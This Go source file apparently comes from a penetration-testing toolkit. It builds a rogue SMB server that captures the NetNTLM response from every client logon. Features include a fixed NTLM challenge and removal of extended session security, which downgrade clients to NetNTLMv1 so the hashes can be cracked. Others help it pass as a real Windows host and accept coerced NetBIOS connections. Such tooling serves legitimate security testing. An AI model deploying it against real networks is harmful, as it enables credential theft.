package server

import (
	"fmt"
	"net"
	"strconv"
	"strings"

	"github.com/TheManticoreProject/Manticore/crypto/spnego"
	"github.com/TheManticoreProject/Manticore/crypto/spnego/ntlm/version"
	"github.com/TheManticoreProject/Manticore/logger"
	"github.com/TheManticoreProject/Manticore/network/smb/common/transport"
	smb1message "github.com/TheManticoreProject/Manticore/network/smb/smb_v10/message"
	smb1commands "github.com/TheManticoreProject/Manticore/network/smb/smb_v10/message/commands"
	smb1codes "github.com/TheManticoreProject/Manticore/network/smb/smb_v10/message/commands/codes"
	smb1 "github.com/TheManticoreProject/Manticore/network/smb/smb_v10/server"
	"github.com/TheManticoreProject/Manticore/network/smb/smb_v10/server/rpcpipe"
	smb2 "github.com/TheManticoreProject/Manticore/network/smb/smb_v20/server"
)

// Options configures a Server.
type Options struct {
	ShareName string
	SharePath string
	ReadOnly  bool

	ListenAddress string
	Port          int
	UseNBT        bool
	ServerName    string
	Domain        string

	// Account is the account served. Nil admits every logon as a guest, which is
	// what a capture wants.
	Account *smb1.Account

	RequireSigning    bool
	RequireEncryption bool

	// Challenge fixes the 8-byte NTLM server challenge instead of drawing a fresh
	// random one per logon. A fixed challenge lets a captured NetNTLM response be
	// cracked against a precomputed table (e.g. crack.sh for NetNTLMv1). Nil keeps
	// a fresh random challenge, which is the safe default.
	Challenge *[8]byte

	// DisableESS strips extended session security from the CHALLENGE, so an
	// NTLMv1-capable client answers with a plain NetNTLMv1 response that crack.sh
	// can resolve to the NT hash. Pair it with a fixed Challenge. A client that
	// computes NTLMv2 is unaffected.
	DisableESS bool

	// AdvertiseVersion, when set, is the Windows version announced in the NTLM
	// CHALLENGE. A real Windows host always sends one; omitting it (nil) is a tell
	// that the server is synthetic.
	AdvertiseVersion *version.Version

	// Browsable serves an IPC$ share answering srvsvc/wkssvc over SMB1, so a
	// client can list the share with `net view`, `smbclient -L` or Explorer.
	Browsable bool

	// LogFileAccess logs every file a client opens (who, path, read or write), so
	// a payload pulled from the share or a file dropped on it is recorded.
	LogFileAccess bool

	EnableSMB1 bool
	EnableSMB2 bool

	OutputFile string
}

// Server serves one share over SMB1 and SMB2/3 on a single listener, routing
// each connection on its first NEGOTIATE, and harvests the NetNTLM response of
// every logon on both.
type Server struct {
	options Options
	smb1    *smb1.Server
	smb2    *smb2.Server
}

// NewServer builds the SMB1 and SMB2 servers the options enable.
func NewServer(options Options) (*Server, error) {
	if !options.EnableSMB1 && !options.EnableSMB2 {
		return nil, fmt.Errorf("at least one of SMB1 and SMB2 must be enabled")
	}
	if options.RequireEncryption && options.EnableSMB1 {
		return nil, fmt.Errorf("SMB1 has no encryption, disable it to require encryption")
	}
	if options.Account == nil && (options.RequireSigning || options.RequireEncryption) {
		return nil, fmt.Errorf("--require-signing and --require-encryption need an account (-u): a guest session derives no key to sign or encrypt with")
	}

	fs, err := smb1.NewLocalFileSystem(options.SharePath, options.ShareName)
	if err != nil {
		return nil, err
	}
	fs.SetReadOnly(options.ReadOnly)

	// One capture handler for both protocols, so the output file and the
	// per-user deduplication are shared. Known accounts are still served
	// (pass-through); the rest fall to the guest or logon-failure policy.
	capture, err := smb2.NewCaptureHandler(smb2.CaptureConfig{
		CaptureConfig: smb1.CaptureConfig{OutputFile: options.OutputFile, UniquePerUser: true},
		PassThrough:   true,
	})
	if err != nil {
		return nil, err
	}

	var authenticator func(domain, username string) ([16]byte, bool)
	if options.Account != nil {
		account := *options.Account
		// Match on the username only, ignoring the domain the client claims: the NT
		// hash does not depend on the domain, so a client that guesses the wrong
		// domain is still served. The configured domain stays display-only.
		authenticator = func(_, username string) ([16]byte, bool) {
			if strings.EqualFold(username, account.Username) {
				return account.NTHash, true
			}
			return [16]byte{}, false
		}
	}
	guest := options.Account == nil

	// onAccept steers each NTLM exchange — a fixed challenge, an advertised
	// version — and is set on both protocols so a captured response and the
	// server's fingerprint are identical whichever a client speaks.
	var onAccept func(*spnego.AcceptContext)
	switch {
	case options.DisableESS:
		// Own the whole CHALLENGE so extended session security can be stripped;
		// the fixed challenge and advertised version fold into it.
		targetName, fixed, advertiseVersion := options.Domain, options.Challenge, options.AdvertiseVersion
		onAccept = func(accept *spnego.AcceptContext) {
			accept.ChallengeProvider = func(negotiateBytes []byte) ([]byte, error) {
				return downgradeChallenge(negotiateBytes, targetName, fixed, advertiseVersion)
			}
		}
	case options.Challenge != nil || options.AdvertiseVersion != nil:
		fixed, advertiseVersion := options.Challenge, options.AdvertiseVersion
		onAccept = func(accept *spnego.AcceptContext) {
			if fixed != nil {
				accept.ServerChallenge = *fixed
			}
			if advertiseVersion != nil {
				accept.Version = advertiseVersion
			}
		}
	}

	s := &Server{options: options}
	if options.EnableSMB1 {
		signing := smb1.SigningEnabled
		if options.RequireSigning {
			signing = smb1.SigningRequired
		}
		s.smb1, err = smb1.NewServer(smb1.Config{
			ServerName:      options.ServerName,
			DomainName:      options.Domain,
			DNSComputerName: options.ServerName,
			DNSDomainName:   options.Domain,
			Authenticator:   authenticator,
			AllowGuest:      guest,
			AllowAnonymous:  guest,
			SigningPolicy:   signing,
			OnAcceptContext: onAccept,
		})
		if err != nil {
			return nil, err
		}
		s.smb1.RegisterHandler(passThroughCapture(capture.CaptureHandler))
		if options.LogFileAccess {
			s.smb1.RegisterHandler(logSMB1FileAccess())
		}
		share := &smb1.Share{Name: options.ShareName, Type: smb1.ShareTypeDisk, FS: fs, ReadOnly: options.ReadOnly}
		if err := s.smb1.AddShare(share); err != nil {
			return nil, err
		}
		if options.Browsable {
			// An IPC$ share answering srvsvc/wkssvc is what a client lists shares
			// over; the SMB2 server has no pipe stack, so browsing is SMB1-only.
			ipc := &smb1.Share{
				Name:  "IPC$",
				Type:  smb1.ShareTypeNamedPipe,
				Pipes: rpcpipe.ForServer(s.smb1, rpcpipe.Options{ServerName: options.ServerName, DomainName: options.Domain}),
			}
			if err := s.smb1.AddShare(ipc); err != nil {
				return nil, err
			}
		}
	}
	if options.EnableSMB2 {
		s.smb2, err = smb2.NewServer(smb2.Config{
			ServerName:        options.ServerName,
			DomainName:        options.Domain,
			DNSComputerName:   options.ServerName,
			DNSDomainName:     options.Domain,
			Authenticator:     authenticator,
			AllowGuest:        guest,
			AllowAnonymous:    guest,
			RequireSigning:    options.RequireSigning,
			RequireEncryption: options.RequireEncryption,
			OnAcceptContext:   onAccept,
		})
		if err != nil {
			return nil, err
		}
		if options.LogFileAccess {
			s.smb2.RegisterHandler(logSMB2FileAccess())
		}
		s.smb2.RegisterHandler(capture)
		// Both shares wrap the same fs, so file contents are consistent across
		// protocols. Open state is not: share modes and oplocks are tracked per
		// server, so an exclusive open over one protocol does not block the other.
		// That is unusual in a capture, and Manticore keeps the two Share types
		// apart, so they are left separate.
		share := &smb2.Share{Name: options.ShareName, FS: fs, ReadOnly: options.ReadOnly}
		if err := s.smb2.AddShare(share); err != nil {
			return nil, err
		}
	}
	return s, nil
}

// ListenAndServe accepts connections until the listener fails.
func (s *Server) ListenAndServe() error {
	addr := net.JoinHostPort(s.options.ListenAddress, strconv.Itoa(s.options.Port))
	var listener transport.Listener
	var err error
	if s.options.UseNBT {
		// nil answers to any CALLED name, so a client coerced to \\anything\share
		// over NetBIOS still reaches the server.
		listener, err = transport.ListenNBT(addr, nil)
	} else {
		listener, err = transport.ListenTCP(addr)
	}
	if err != nil {
		return err
	}
	defer listener.Close()

	logger.Infof("Serving %s as \\\\%s\\%s on %s (%s)", s.options.SharePath, s.options.ServerName, s.options.ShareName, listener.Addr(), s.protocols())
	for {
		t, remote, err := listener.Accept()
		if err != nil {
			return fmt.Errorf("failed to accept an SMB connection: %v", err)
		}
		go s.serveConn(t, remote)
	}
}

// serveConn hands a connection to the server its first frame calls for.
func (s *Server) serveConn(t transport.Transport, remote net.Addr) {
	var err error
	switch {
	case s.smb2 == nil:
		err = s.smb1.ServeConn(t, remote)
	case s.smb1 == nil:
		err = s.smb2.ServeConn(t, remote)
	default:
		// Bound the wait for the first frame, as each sub-server bounds its own
		// handshake: without it a client that connects and stays silent holds a
		// goroutine for good, because neither sub-server has seen the connection
		// yet to time it out. Cleared once the frame is in, so the chosen
		// sub-server applies its own read timeouts.
		t.SetTimeout(smb2.DefaultHandshakeTimeout)
		var first []byte
		if first, err = t.Receive(); err != nil {
			t.Close()
			break
		}
		t.SetTimeout(0)
		replay := &replayTransport{Transport: t, first: first}
		protocol := route(first)
		logger.Debugf("Serving %s over %s", remote, protocol)
		if protocol == SMB1 {
			err = s.smb1.ServeConn(replay, remote)
		} else {
			err = s.smb2.ServeConn(replay, remote)
		}
	}
	if err != nil {
		logger.Debugf("Refusing %s: %v", remote, err)
	}
}

func (s *Server) protocols() string {
	switch {
	case s.smb1 == nil:
		return "SMB 2/3"
	case s.smb2 == nil:
		return "SMB1"
	}
	return "SMB1, SMB 2/3"
}

// passThroughCapture records the AUTHENTICATE leg of an SMB1 session setup and
// lets the logon proceed, as the SMB2 capture handler does with PassThrough;
// the SMB1 capture handler alone always refuses it.
func passThroughCapture(capture *smb1.CaptureHandler) smb1.Handler {
	return smb1.HandlerFunc(func(srv *smb1.Server, conn *smb1.Connection, w smb1.ResponseWriter, req *smb1message.Message) bool {
		if req.Header.Command != smb1codes.SMB_COM_SESSION_SETUP_ANDX {
			return false
		}
		accept := conn.PendingAuth(uint16(req.Header.UID))
		request, ok := req.Command.(*smb1commands.SessionSetupAndxRequest)
		if accept == nil || !ok || len(request.SecurityBlob) == 0 || accept.AcceptAuthenticateToken([]byte(request.SecurityBlob)) != nil {
			return false
		}
		capture.Record(conn.Remote, accept)
		return false
	})
}
